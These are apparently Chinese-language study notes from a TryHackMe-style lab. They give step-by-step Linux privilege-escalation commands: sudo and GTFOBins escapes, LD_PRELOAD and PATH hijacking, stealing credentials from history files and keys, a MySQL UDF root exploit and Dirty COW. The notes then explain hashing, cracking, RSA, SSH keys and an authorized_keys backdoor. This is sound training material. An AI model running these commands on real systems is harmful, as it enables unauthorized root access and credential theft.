对于本节，运行“sudo -l”后从可用列表中选择一个程序，并尝试按照 GTFOBins 的说明获取 root shell。选择使用“vim”程序。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116113413983.png" alt="image-20231116113413983" style="zoom:50%;" />

使用第一行，我只是生成了一个以 root 身份运行的 Bash shell 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116113513538.png" alt="image-20231116113513538" style="zoom:50%;" />

我还尝试通过以下方式使用“iftop”sudo 漏洞

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116113542559.png" alt="image-20231116113542559" style="zoom:50%;" /> 



**例子**

此漏洞取决于我们的用户帐户枚举的有效性。每次您有权访问帐户时，都应该**使用“  sudo -l  ”列出您可以作为 root 使用的命令**。有时，您会发现无需 root 密码即可以 root 身份运行某些命令。 

帐户上运行“  sudo -l  ” 在user8 表明他们可以使用 root 权限运行 vi。   这使我们能够逃脱 vim 以升级权限并以 root 用户身份获得 shell。 

如果您在枚举过程中或在检查用户帐户有权访问哪些二进制文件时发现配置错误的二进制文件，那么 GTFOBins（https://gtfobins.github.io/）是查找如何利用它们的好地方。  这是 Unix 二进制文件的精选列表，攻击者可以利用这些二进制文件绕过本地安全限制。 





#### Sudo - 环境变量

可以将 Sudo 配置为从用户环境继承某些环境变量。要检查继承了哪些环境变量，请使用“sudo -l”命令并查找“env_keep”选项。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116113904653.png" alt="image-20231116113904653" style="zoom:50%;" />

LD_PRELOAD 和 LD_LIBRARY_PATH 都是从用户环境继承的。当程序运行时，LD_PRELOAD 在任何其他对象之前加载共享对象。LD_LIBRARY_PATH 提供首先搜索共享库的目录列表。

我们可以做的第一件事是使用位于 /home/user/tools/sudo/preload.c 的代码创建一个共享对象

    gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c

接下来，运行通过 sudo 允许的程序之一，同时将 LD_PRELOAD 环境变量设置为新共享对象的完整路径。

    sudo LD_PRELOAD=/tmp/preload.so [program-name]

应该会生成一个root shell。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116114141083.png" alt="image-20231116114141083" style="zoom:50%;" />



**使用 LD_LIBRARY_PATH 的第二种方法**，可以先对 apache2 程序文件运行 ldd 来查看该程序使用了哪些共享库

    ldd /usr/sbin/apache2

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116114246853.png" alt="image-20231116114246853" style="zoom: 33%;" />

接下来，使用位于 /home/user/tools/sudo/library_path.c 的代码创建一个与列出的库之一 (libcrypt.so.1) 同名的共享对象：

    gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

最后，使用 sudo 运行 apache2，同时将 LD_LIBRARY_PATH 环境变量设置为 /tmp（我们在其中输出编译的共享对象）。

    sudo LD_LIBRARY_PATH=/tmp apache2

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116114445750.png" alt="image-20231116114445750" style="zoom:67%;" />





#### 利用 PATH 变量

PATH 是 Linux 和类 Unix 操作系统中的一个环境变量，它指定保存可执行程序的目录。当用户在终端中运行任何命令时，它会在 PATH 变量的帮助下搜索可执行文件，以响应用户执行的命令。 要查看 PATH 变量，请使用“echo $PATH”命令

假设我们有一个 SUID 二进制文件。运行它，我们可以看到它调用系统 shell 来执行一个基本过程，例如使用“ps”列出进程。在这种情况下，我们无法通过提供命令注入参数来利用它，我们可以做什么？我们可以将 PATH 变量重写到我们选择的位置。当 SUID 二进制文件调用系统 shell 时，它会运行我们编写的 shell。与任何 SUID 文件一样，它将以与 SUID 文件所有者相同的权限运行该命令。

例如：

进入user5的主目录并运行文件“script”。 我们认为它正在执行什么命令？
答：查看他们的主目录，我们看到一个名为 script 的文件，该文件属于 root。 运行它只是列出当前目录的内容 - 运行 ls 命令

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231115235836304.png" alt="image-20231115235836304" style="zoom: 50%;" />


Q3：现在我们知道要模仿什么命令了。 切换到/tmp目录

Q4：在 /tmp 内，创建一个模拟可执行文件。 我们想要执行的格式是：echo“[我们想要运行的命令]”> [我们想要模仿的可执行文件的名称]。打开 bash shell 并使用我们正在模仿的可执行文件的名称写入文件的命令会是什么样子？
答：我们可以在 /tmp 目录中创建一个名为“ls”的文件（我们要模仿的命令），其中包含用于生成 shell 的 /bin/bash 代码

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116000023138.png" alt="image-20231116000023138" style="zoom:50%;" />

Q5：现在仿制完成了，我们需要将其设为可执行文件。 我们要执行什么命令来做到这一点？
A：接下来，只需运行“chmod +x ls”即可为文件添加可执行权限

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116000118480.png" alt="image-20231116000118480" style="zoom:50%;" />

现在，我们需要更改 PATH 变量，使其指向我们存储模拟“ ls ”的目录。 我们使用命令“ export PATH=/tmp:$PATH ”来执行此操作。 这将导致您每次使用“ls”时都会打开 bash 提示符。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116000146968.png" alt="image-20231116000146968" style="zoom:50%;" />

如果您需要在完成利用之前使用 ls，请改用“/bin/ls”。 完成漏洞利用后，您可以退出 root 并使用“export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/ usr/games:/usr/local/games:$PATH”来重置 PATH 变量。

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116000225473.png" alt="image-20231116000225473" style="zoom:50%;" />

Q7: 现在，将目录更改回 user5 的主目录

Q8：最后再次运行脚本文件并获得 root bash shell 





#### 密码和密钥

##### 密码和密钥 - 历史文件 

如果用户不小心在命令行而不是在密码提示中输入密码，则该密码可能会记录在历史文件中。要列出用户主目录中所有隐藏的历史文件，请使用以下命令： 

    cat ~/.*history | less

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116221607241.png" alt="image-20231116221607241" style="zoom:50%;" />

请注意，用户在某个时刻尝试使用 root 用户名和通过命令行提交的密码连接到 MySQL 服务器 - “-p”选项和密码之间没有空格，只需使用找到的密码切换到 root 用户即可。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116221710746.png" alt="image-20231116221710746" style="zoom:50%;" />





##### 密码和密钥 - 配置文件 

配置文件通常包含明文或其他可逆格式的密码。通过列出用户主目录的内容，我们可以看到一个 .ovpn 配置文件。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116221944844.png" alt="image-20231116221944844" style="zoom:50%;" />

查看此文件的内容，我们看到对可以找到根用户凭据的另一个位置的引用。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116222007894.png" alt="image-20231116222007894" style="zoom:50%;" />

查看新文件，我们会看到凭据。现在，只需使用找到的凭据切换到根用户即可。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116222116129.png" alt="image-20231116222116129" style="zoom: 67%;" />



##### 密码和密钥 - SSH 密钥 

有时，用户会备份重要文件，但无法使用正确的权限来保护它们。查看系统根目录中的隐藏文件，我们发现一个名为“.ssh”的隐藏目录 - 这通常包含用于远程身份验证的 SSH 密钥。 

往里面看，我们看到有一个世界可读的文件，名为 root_key。进一步检查该文件应表明它是一个 SSH 私钥 - 该文件的名称表明它适用于 root 用户。
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116222534141.png" alt="image-20231116222534141" style="zoom:50%;" />

现在我们有了这个，我们可以将密钥复制到本地计算机并在使用它之前为其授予正确的权限（600）。
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116222617815.png" alt="image-20231116222617815" style="zoom:67%;" />

配置完成后，只需使用密钥以 root 帐户登录目标即可。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116222639097.png" alt="image-20231116222639097" style="zoom: 67%;" />





#### MySQL服务漏洞利用

MySQL 服务以 root 身份运行，并且该服务的“root”用户没有分配密码。**为了利用这漏洞(https://www.exploit-db.com/exploits/1518)**，我们可以利用用户定义函数 (UDF) 通过 MySQL 服务以 root 身份运行系统命令。

运行此漏洞的第一步是切换到“  /home/user/tools/mysql-udf  ”目录。 到达那里后，我们必须使用以下命令编译“raptor_udf2.c”利用代码：

    gcc -g -c raptor_udf2.c -fPIC 
    
    gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc 

编译完成后，我们以root用户无密码连接MySQL服务。

    mysql -u root

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116110017067.png" alt="image-20231116110017067" style="zoom:67%;" />

进入后，在 MySQL shell 上执行以下命令，使用我们编译的漏洞创建用户定义函数 (UDF)“do_system”

    use mysql;
    
    create table foo(line blob);
    
    insert into foo values(load_fule(‘/home/raptor/raptor_udf2.so’));
    
    select * from foo into dumpfile ‘/usr/lib/raptor_udf2.so’;
    
    create function do_system returns integer soname ‘raptor_udf2.so’;

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116110259272.png" alt="image-20231116110259272" style="zoom:50%;" />

完成后，使用该函数将 /bin/bash 复制到 /tmp/rootbash 并设置 SUID 权限： 

    select do_system(cp ‘/bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash’); 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116110355611.png" alt="image-20231116110355611" style="zoom:50%;" />

然后，退出 MySQL shell 并使用“-p”运行“/tmp/rootbash”可执行文件，以获得以 root 权限运行的 shell。
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116110457033.png" alt="image-20231116110457033" style="zoom:50%;" />

完成后，删除 /tmp/rootbash 可执行文件并退出 root shell，然后再继续。 





#### 内核漏洞利用 

内核漏洞可能会使系统处于不稳定状态 - 您应该只将它们作为最后的手段来运行。为此，请运行 Linux Exploit Suggester 2 工具来识别当前系统上潜在的内核漏洞。 

    perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116223919088.png" alt="image-20231116223919088" style="zoom:67%;" />

列出了流行的 Linux 内核漏洞“Dirty COW”。  Dirty Cow 的利用代码可以在“/home/user/tools/kernel-exploits/dirtycow/c0w.c”中找到。它将 SUID 文件 /usr/bin/passwd 替换为生成 shell 的文件（/usr/bin/passwd 的备份在 /tmp/bak 中进行） 

要编译代码并运行它，请使用以下命令： 

    gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w 
    
    ./c0w 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116224107849.png" alt="image-20231116224107849" style="zoom:50%;" />

漏洞利用完成后，运行 /usr/bin/passwd 以获取 root shell。 
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116224159570.png" alt="image-20231116224159570" style="zoom:50%;" /> 





#### 权限提升脚本

已经编写了一些工具来帮助发现 Linux 上潜在的权限升级。  其中三个工具已包含在目标的 /home/user/tools/privesc-scripts 中。 

尝试这些工具 - 使用不同的选项运行它们。  自己运行每个脚本并查看它们。  我将提供每个的基本屏幕截图。 
LinEnum
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116224359660.png" alt="image-20231116224359660" style="zoom:50%;" />

LinPeas
<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116224445534.png" alt="image-20231116224445534" style="zoom:67%;" />

LSE 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231116224540304.png" alt="image-20231116224540304" style="zoom: 50%;" />





#### 其他拓展

Linux 权限提升技术从来没有“神奇”的答案。这些只是尝试升级时需要注意的基本事项的几个示例。检查表是确保您在枚举阶段没有遗漏任何内容的好方法，并且还可以提供资源来检查如果您忘记了该怎么做。 

以下是适用于 CTF 或渗透测试的良好清单。 

    https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
    
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
    
    https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
    
    https://payatu.com/guide-linux-privilege-escalation 





















## 加密

一些术语：

    明文 - 加密或散列之前的数据，通常是文本，但并不总是如此，因为它可能是照片或其他文件。
    编码 - 这不是一种加密形式，只是一种数据表示形式，如 base64 或十六进制。立即可逆。
    哈希 - 哈希是哈希函数的输出。散列也可以用作动词，“散列”，意思是产生一些数据的散列值。
    暴力破解 - 通过尝试不同的密码或不同的密钥来攻击密码学
    密码分析 - 通过寻找底层数学的弱点来攻击密码学 



### Hash

哈希函数与加密有很大不同。 没有密钥，这意味着不可能（或非常非常困难）从输出返回到输入。

哈希函数采用任意大小的一些输入数据，并创建该数据的摘要summary或“摘要digest”。输出是固定大小的。很难预测任何输入的输出是什么，反之亦然。好的散列算法的计算速度（相对）快，而反转速度慢（从输出开始并确定输入）。输入数据的任何微小变化（即使是单个位）都会导致输出发生较大变化。哈希函数的输出通常是原始字节，然后对其进行编码。 常见的编码是 64 进制或十六进制。 解码这些不会给你任何有用的东西。

哈希在网络安全中经常使用。 当您登录 TryHackMe 时，它使用哈希来验证您的密码。 当您登录计算机时，也会使用散列来验证您的密码。 您与散列的间接交互比您想象的要多，主要是在密码方面。

**哈希冲突**，哈希冲突是指两个不同的输入给出相同的输出。 哈希函数旨在尽可能避免这种情况，特别是能够设计（故意创建）冲突。 

MD5 和 SHA1 已受到攻击，并且由于工程哈希冲突而在技术上变得不安全。 然而，还没有攻击同时在两种算法中产生冲突，因此如果您使用 MD5 哈希值和 SHA1 哈希值进行比较，您会发现它们是不同的。 MD5 冲突示例可从 https://www.mscs.dal.ca/~selinger/md5collision/ 获取，SHA1 冲突的详细信息可从 https://shattered.io/ 获取。 因此，您不应该信任散列密码或数据的算法。 

#### **散列的用途**

哈希在网络安全中有两个主要目的，验证数据的完整性或验证密码。这就是散列的用武之地。如果您不存储密码，而是只存储密码的散列怎么办，  这意味着您永远不必存储用户的密码，如果您的数据库被泄露，那么攻击者就必须破解每个密码才能找出密码是什么，这听起来相当有用。

这只有一个问题。  如果两个用户具有相同的密码怎么办，由于哈希函数始终将相同的输入转换为相同的输出，因此您将为每个用户存储相同的密码哈希。这意味着如果有人破解了该哈希值，他们就会进入多个帐户。  这也意味着有人可以创建一个“彩虹表Rainbow table”来破坏哈希值。

**彩虹表是哈希值到明文的查找表，因此您可以快速从哈希值中找出用户刚刚拥有的密码。** 彩虹表用破解哈希所需的时间来换取硬盘空间，但它们的创建确实需要时间。这是一个简单的示例，以便您可以尝试并了解它们是什么样的：

| Hash                             | Password |
| -------------------------------- | -------- |
| e99a18c428cb38d5f260853678922e03 | abc123   |
| b0baee9d279d34fa1dfd71aadb908c3f | 11111    |
| e10adc3949ba59abbe56e057f20f883e | 123456   |

像 Crackstation 这样的网站内部使用巨大的彩虹表来提供无盐salt哈希的快速密码破解。 在哈希的排序列表中进行查找确实非常快，比尝试破解哈希快得多。

防范彩虹表

为了防止出现彩虹表，我们在密码中添加了salt。salt是随机生成并存储在数据库中，对于每个用户来说都是唯一的。理论上，您可以对所有用户使用相同的盐，但这意味着重复的密码仍将具有相同的哈希值，并且仍然可以使用该盐创建特定密码的彩虹表。

**用于完整性检查的散列** 

完整性检查

散列可用于检查文件是否未被更改。如果你输入相同的数据，你总是得到相同的数据。 即使只有一个位发生变化，哈希值也会发生很大变化。这意味着您可以使用它来检查文件是否未被修改或确保它们已正确下载。您还可以使用散列来查找重复文件，如果两张图片具有相同的散列，那么它们就是同一张图片。

HMAC

HMAC 是一种使用加密哈希函数来验证数据的真实性和完整性的方法。 TryHackMe VPN 使用 HMAC-SHA512 进行消息身份验证，您可以在终端输出中看到。 HMAC 可用于确保创建 HMAC 的人是他们所说的人（真实性），并且消息未被修改或损坏（完整性）。 他们使用密钥和散列算法来生成散列。







#### 识别密码哈希值

存在 https://pypi.org/project/hashID/ 等自动哈希识别工具，但它们对于许多格式来说并不可靠。对于具有前缀的哈希，这些工具是可靠的。使用语境和工具的组合。如果您在 Web 应用程序数据库中找到哈希值，则它更有可能是 md5，而不是 NTLM。自动哈希识别工具经常将这些哈希类型混淆，这凸显了自学的重要性。

Unix 风格的密码哈希非常容易识别，因为它们有一个前缀。前缀告诉您用于生成哈希值的哈希算法。标准格式是 **$format$rounds$salt$hash**。

Windows 密码使用 NTLM（md4 的变体）进行哈希处理。 它们在视觉上与 md4 和 md5 哈希相同，因此使用上下文来计算哈希类型非常重要。

在 Linux 上，密码哈希值存储在 /etc/shadow 中。 该文件通常只能由 root 读取。它们曾经存储在 /etc/passwd 中，并且每个人都可以读取。

在 Windows 上，密码哈希值存储在 SAM 中。Windows 试图阻止普通用户转储它们，但存在像 mimikatz 这样的工具。 重要的是，在那里找到的哈希值分为 NT 哈希值和 LM 哈希值。

下面是您将看到的最具 Unix 风格的密码前缀的快速表。 

|            字首             |                        算法                         |
| :-------------------------: | :-------------------------------------------------: |
|             $1$             | md5crypt，用于 Cisco 的东西和较旧的 Linux/Unix 系统 |
| $2$, $2a$, $2b$, $2x$, $2y$ |            Bcrypt（流行于网络应用程序）             |
|             $6$             |    sha512crypt（大多数 Linux/Unix 系统的默认值）    |

查找更多哈希格式和密码前缀的好地方是 hashcat 示例页面，可在此处找到：https://hashcat.net/wiki/doku.php?id=example_hashes



#### 密码破解 

我们已经提到彩虹表是一种破解不含盐的哈希值的方法，但是如果涉及盐怎么办。您无法“解密”密码哈希值，它们没有加密。您必须通过散列大量不同的输入（通常很震撼，这些是可能的密码）来破解散列，如果有的话可能会添加盐并将其与目标散列进行比较。一旦匹配，您就知道密码是什么。 **Hashcat 和 John the Ripper 等工具**通常用于此目的。

破解 GPU

显卡有数千个核心。尽管它们无法完成与 CPU 相同的工作，但它们非常擅长哈希函数中涉及的一些数学运算。这意味着您可以使用显卡更快地破解大多数哈希类型。一些哈希算法（尤其是 bcrypt）的设计使得 GPU 上的哈希值与 CPU 上的哈希值大致相同，这有助于它们抵抗破解。

在虚拟机上破解

虚拟机通常无法访问主机的显卡（您可以进行设置，但工作量很大）。 如果您想运行 hashcat，最好在您的主机上运行它（Windows 版本可在网站上找到，从 powershell 运行它）。 您可以让 Hashcat 在虚拟机中使用 OpenCL，但速度可能会比在主机上破解要差得多。 John the ripper 默认使用 CPU，因此可以在开箱即用的虚拟机中工作，尽管在主机操作系统上运行它可能会获得更好的速度，因为它将有更多线程，并且在虚拟机中运行不会产生任何开销。

永远不要对 hashcat 使用 --force 。它可能会导致误报（向您提供错误的密码）和漏报（跳过正确的哈希值）。

更新：从 Kali 2020.2 开始，hashcat 6.0 将在没有 --force 的情况下在 CPU 上运行。 如果你有 GPU，我仍然建议破解你的主机操作系统，因为它会快得多。





### 加密

关键术语

    密文 - 加密明文、加密数据的结果
    
    密码 - 一种加密或解密数据的方法。现代密码是密码学的，但也有许多非密码学像凯撒一样的密码。
    
    明文 - 加密前的数据，通常是文本，但并非总是如此。可能是照片或其他文件
    
    加密 - 使用密码将数据转换为密文。
    
    编码 - 不是一种加密形式，只是一种数据表示形式，如 base64。立即可逆。
    
    密钥 ——正确解密密文并获得明文所需的一些信息。
    
    密码短语 - 与密钥分开，密码短语类似于密码，用于保护密钥。
    
    非对称加密 - 使用不同的密钥进行加密和解密。
    
    对称加密 ——使用相同的密钥进行加密和解密
    
    暴力破解 - 通过尝试不同的密码或不同的密钥来攻击密码学
    
    密码分析 - 通过寻找底层数学的弱点来攻击密码学 

密码学用于保护机密性、确保完整性、确保真实性。  您很可能每天都使用加密技术，并且几乎可以肯定您现在正在通过加密连接阅读本文。

 登录 TryHackMe 时，您的凭据已发送到服务器。  这些都是加密的，否则有人可以通过窥探您的连接来捕获它们。当您连接到 SSH 时，您的客户端和服务器会建立一条加密隧道，这样就没有人可以窥探您的会话。当您连接到银行时，会有一个使用加密技术的证书来证明它实际上是您的银行而不是黑客。



#### 加密类型 

加密的两个主要类别是对称和非对称。

    对称加密：使用相同的密钥来加密和解密数据。对称加密的示例有 DES （损坏）和 AES。这些算法往往比非对称加密更快，并且使用更小的密钥（AES 常见的是128或256位密钥，DES 密钥为56位长）。
    
    非对称加密：使用一对密钥，一个用于加密，另一个用于解密。例如 RSA 和椭圆曲线加密技术。通常这些密钥被称为公钥和私钥。使用私钥加密的数据可以使用公钥解密，反之亦然。您的私钥需要保密，因此得名。非对称加密往往速度较慢并使用较大的密钥，例如 RSA 通常使用2048至4096位密钥。



#### RSA

RSA - Rivest Shamir Adleman 

数学方面

RSA 基于计算大量因子的数学难题。非常快将两个素数相乘，例如 17*23 = 391，但是很难计算出两个素数是多少 相乘得到 14351

进攻方

RSA 背后的数学似乎在 CTF 中相对频繁地出现，通常要求您计算变量或 破解基于它们的一些加密。 RSA 的维基百科页面乍一看似乎很复杂，但会给你几乎 完成挑战所需的所有信息。有一些优秀的工具可以用来应对 CTF 中的 RSA 挑战，我个人最喜欢的是 https://github.com/Ganapati/RsaCtfTool，它对我来说非常有效。我在 https://github.com/ius/rsatool 上也取得了一些成功。

对于 CTF 中的 RSA，您需要了解的关键变量是 p、q、m、n、e、d 和 c。“p”和“q”是大素数，“n”是p和q的乘积。公钥是n和e，私钥是n和d。“m”用于表示消息（明文），“c”表示密文（加密文本）。

涉及 RSA 的 CTF

Crypto CTF 挑战通常会向您提供一组这些值，您需要破解加密并解密消息才能检索标志。RSA 还有很多数学知识，而且很快就会变得相当复杂。 如果你想了解它背后的数学，我 建议阅读 MuirlandOracle 的博客文章： https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/ 。





#### 非对称加密技术建立密钥 

非对称加密的一个非常常见的用途是交换对称加密的密钥。非对称加密往往速度较慢，因此对于 HTTPS 之类的东西，对称加密更好。但问题是，如何在不将密钥传输给窥探者查看的情况下与服务器达成一致？

假设您有一个密码以及如何使用该密码的说明。  如果您想在其他人无法阅读的情况下向您的朋友发送说明，您可以向您的朋友请求锁。只有他们有这把锁的钥匙，我们假设你有一个坚不可摧的盒子，可以用它锁上。如果您将上锁的盒子中的说明发送给您的朋友，他们可以在收到盒子后将其解锁并阅读说明。之后，您就可以使用密码进行通信，而无需担心被人窥探。在这个比喻中，密码secret code代表对称加密密钥，锁代表服务器的公钥，key代表服务器的私钥。您只使用过一次非对称加密，因此速度很快，而且您现在可以使用对称加密进行私密通信。

实际上，您需要更多的加密技术来验证与您交谈的人是否是他们所说的人 它们是，这是使用数字签名和证书完成的。 您可以从这篇优秀的博客文章中找到有关 HTTPS（需要交换密钥的一个示例）如何真正工作的更多详细信息。 https://robertheaton.com/2014/03/27/how-does-https-actually-work/





#### 数字签名和证书 

**数字签名Digital Signature**

数字签名是证明文件真实性、证明文件创建者或修改者的一种方法。使用非对称加密技术，您可以使用私钥生成签名，并且可以使用公钥对其进行验证。由于只有您有权访问您的私钥，这证明您已签署了该文件。  在英国，数字签名和物理签名在法律上具有相同的价值。

最简单的数字签名形式是使用您的私钥对文档进行加密，然后如果有人 想要验证此签名，他们会使用您的公钥对其进行解密并检查文件是否匹配。
**证书 Certificates**

证书也是公钥加密技术的一个重要用途，与数字签名相关。它们最常见的用途是 HTTPS。您的网络浏览器如何知道您正在交谈的服务器是真正的 tryhackme.com？答案是证书。 该网络服务器有一个证书，表明它是真正的 tryhackme.com。证书具有从root CA（certificate authority 证书颁发机构）开始的信任链。root CA 在安装后会自动受到您的设备、操作系统或浏览器的信任。下面的证书是受信任的，因为该组织受到root CA 的信任等等，有很长的信任链。再次，这篇博文比我更好地解释了这一点。  https://robertheaton.com/2014/03/27/how-does-https-actually-work/

您可以使用 Let's Encrypt 免费为您拥有的域获取自己的 HTTPS 证书。 如果你经营一个网站， 值得设置它。





#### SSH 身份验证 

加密和 SSH 身份验证

默认情况下，SSH 使用用户名和密码进行身份验证，与登录物理机的方式相同。

在某些时候，您会访问一台配置有密钥身份验证的 SSH 的计算机。这使用公钥和私钥来证明客户端是服务器上的有效且授权的用户。默认情况下，SSH 密钥是 RSA 密钥。您可以选择生成哪种算法或添加密码来加密 SSH 密钥。ssh-keygen 是大多数时候用于生成密钥对的程序。

**SSH 私钥**

您应该像对待密码一样对待您的 SSH 私钥。不要共享它们，它们被称为私钥是有原因的。 如果某人拥有您的私钥，他们可以使用它登录到接受该私钥的服务器，除非该密钥已加密。

值得一提的是，解密密钥的密码根本不用于向服务器识别您的身份，它所做的只是解密 SSH 密钥。密码永远不会被传输，也永远不会离开您的系统。

使用 John the Ripper 等工具，您可以攻击加密的 SSH 密钥以尝试找到密码短语，这凸显了使用安全密码短语和保持私钥私密性的重要性。

生成 SSH 密钥以登录远程计算机时，您应该在您的计算机上生成密钥，然后复制公钥，因为这意味着目标计算机上永远不存在私钥。

**使用key**

~/.ssh 文件夹是存储 OpenSSH 这些密钥的默认位置。该目录中的authorized_keys 文件保存着在启用密钥身份验证的情况下允许访问服务器的公钥。默认情况下，在许多发行版上，都会启用密钥身份验证，因为它比使用密码进行身份验证更安全。 通常对于root用户，只启用密钥认证。

为了使用 SSH 私钥，必须正确设置权限，否则 SSH 客户端将忽略该文件并发出警告。只有所有者才能读取或写入私钥（600 或更严格）。  ssh -i keyNameGoesHere user@host 是为标准 Linux OpenSSH 客户端指定密钥的方式。

使用 SSH 密钥获得更好的 shell

 SSH 密钥是“升级”反向 shell 的绝佳方法，假设用户已启用登录（www-data 通常不会，但普通用户和 root 会）。 在盒子上的authorized_keys中留下SSH密钥可能是一个有用的后门，并且您不需要处理任何不稳定的反向shell（例如Control-C）或缺乏制表符补全的问题。



#### PGP、GPG、AES 

**PGP**

PGP 代表“Pretty Good Privacy 良好隐私”。它是一款实现加密文件、执行数字签名等功能的软件。

**GPG**

GnuPG 或 GPG 是 GNU 项目中 PGP 的开源实现。您可能需要使用 GPG 来解密 CTF 中的文件。使用 PGP/GPG，可以使用与 SSH 私钥类似的方式使用密码来保护私钥。 如果密钥受密码保护，您可以尝试使用 John The Ripper 和 gpg2john 破解该密码。

**AES**

AES（Advanced Encryption Standard 高级加密标准）。它是 DES 的替代品，DES 存在短密钥和其他加密缺陷。AES 和 DES 都对数据块进行操作。AES 解释起来很复杂，并且似乎不经常出现。 如果你愿意 了解它是如何工作的，这是来自 Computerphile 的精彩视频 https://www.youtube.com/watch?v=O4xNJsjtN6E 























